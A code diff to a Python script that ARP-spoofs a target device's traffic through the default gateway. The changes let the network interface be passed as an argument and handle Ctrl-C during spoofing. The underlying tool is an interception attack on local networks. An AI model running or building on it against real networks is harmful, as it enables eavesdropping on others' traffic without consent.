@@ -29,7 +29,12 @@ def main():
 
     specific_device_ip = sys.argv[1]
     gateway_ip = get_default_gateway_linux()
-    interface = "wlo1"  # Replace with your network interface name
+    
+    if len(sys.argv) > 2:
+        interface = sys.argv[2]
+    else:
+        interface = "wlo1" 
+        print(f"Warning: No interface specified, using default: {interface}")
 
     if not gateway_ip:
         print("Unable to determine the default gateway.")
@@ -46,7 +51,10 @@ def main():
     subprocess.run(command2, shell=True, check=True)
 
     # Run ARP spoofing for the specific device
-    run_arpspoof(specific_device_ip, gateway_ip, interface)
+    try:
+        run_arpspoof(specific_device_ip, gateway_ip, interface)
+    except KeyboardInterrupt:
+        print("\nStopping ARP spoofing.")
 
 if __name__ == "__main__":
     main()
